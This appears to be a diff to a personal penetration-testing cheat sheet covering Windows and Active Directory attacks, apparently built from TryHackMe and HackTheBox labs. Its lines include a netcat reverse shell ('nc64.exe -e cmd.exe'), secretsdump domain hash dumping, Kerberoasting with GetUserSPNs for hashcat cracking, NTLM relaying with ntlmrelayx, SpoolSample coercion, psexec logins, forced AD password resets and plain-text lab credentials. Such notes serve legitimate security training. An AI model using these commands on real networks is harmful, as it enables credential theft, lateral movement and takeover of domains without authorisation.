@@ -202,6 +202,11 @@ PS> Get-WmiObject Win32_Group | Select-Object Name, SID
 # Service
 PS> Get-Service
 PS> Get-Service | ? {$_.DisplayName -like "*Hoge*"}
+PS> Get-Service | ? {$_.Status -eq "Running"} | select -First 2 | fl
+PS> Get-Service | ? {$_.Name -like "*Update*"} | select -First 2 | fl
+PS> Get-Service | ? {$_.Status -eq "Running"} | echo | sls "update"
+PS> Get-Service | ? {$_.DisplayName -like "*Update*"} | select -First 4 | fl
+PS> Get-Service -Name HogeService | fl
 # Share
 PS> Get-WmiObject Win32_Share | Select-Object Name, Path
 PS> Get-SmbShare | Select-Object Name, Path
@@ -217,8 +222,11 @@ PS> runas /netonly /user:HOGE.com\TestUser "c:\tools\nc64.exe -e cmd.exe XXX.XXX
 ```powershell
 PS> Import-Module ActiveDirectory
 # User
+PS> Get-ADUser -Identity TestUser -Properties *
 PS> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
-# 
+# Group
+PS> Get-ADGroup -Identity "Enterprise Admins" -Properties * | Out-String | Select-String sid
+#
 PS> $Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force; Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword $Password
 ```
 ## sc.exe
@@ -327,15 +335,7 @@ icacls c:\windows
 icacls c:\users
 
 
-Get-Service | ? {$_.Status -eq "Running"} | select -First 2 | fl
 
-Get-Service | ? {$_.Name -like "*pdate*"} | select -First 2 | fl
-
-Get-Service | ? {$_.Status -eq "Running"} | echo | sls "update"
-
-Get-Service | ? {$_.DisplayName -like "*Update*"} | select -First 4 | fl
-
-Get-Service -Name FoxitReaderUpdateService | fl
 
 $service = Get-Service -Name FoxitReaderUpdateService | Write-Output "Executable Path : $($service.PathName)"
 ... no display
@@ -632,24 +632,15 @@ PS> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceT
 $ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
 $ ls inlanefreight_hashes*
 ```
-```ps
-PS> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
-
-```
-
-
-
-
-
 
 # SpoolSample.exe
 SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.200.83.201"
-python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://10.200.83.201 -debug
+
 
 
 $ Set-ADAccountPassword -Identity "t2_june.russell" -Reset -NewPassword $Password
 $ $username = 't1_corine.waters'; $password = 'Korine.1994'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = $ New-Object System.Management.Automation.PSCredential $username, $securePassword; $Opt = New-CimSessionOption -Protocol DCOM; $Session =  New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
-$ Get-ADGroup -Identity "Enterprise Admins" -Properties * | Out-String | Select-String sid
+
 $ $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
 $ Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
 
@@ -683,10 +674,6 @@ https://github.com/PowerShellMafia/PowerSploit
 ```powershell
 PS> psexec64.exe \\MACHINE_IP -u TestAdminUser -p TestAdminPassword -i cmd.exe
 ```
-
-psexec.py inlanefreight.local/SAPService:'!SapperFi2'@172.16.5.5
-
-
 
 # Inveigh
 ## powershell
@@ -725,6 +712,25 @@ $ set +H
 $ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --groups
 ```
 
+# impacket
+## GetUserSPNs.py
+```zsh
+$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo
+$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo r-request
+$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob
+$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob -outputfile bob_tgs
+# -> Hashcat
+```
+## ntlmrelayx.py
+```zsh
+$ ntlmrelayx.py -smb2support -t smb://XXX.XXX.XXX.XXX -debug
+```
+## psexec.py
+tag: shell
+```zsh
+$ psexec.py HOGE.com/piyo:'TestPassword'@XXX.XXX.XXX.XXX
+```
+
 # enum4linux
 ```zsh
 $ enum4linux -P XXX.XXX.XXX.XXX
@@ -744,19 +750,9 @@ $ ldapsearch -h 172.16.0.10 -x -b "DC=HOGE,DC=COM" -s sub "(&(objectclass=user))
 
 # windapsearch
 ```zsh
-$ ;/windapsearch.py -h
+$ ./windapsearch.py -h
 $ ./windapsearch.py --dc-ip 172.16.0.10 -u "" -U
 $ python3 windapsearch.py --dc-ip 172.16.5.5 -u TestSpnAccountUser -p TestSpnAccountPassword -PU
-```
-
-# impacket
-## GetUserSPNs.py
-```zsh
-$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo
-$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo r-request
-$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob
-$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob -outputfile bob_tgs
-# -> Hashcat
 ```
 
 # noPac
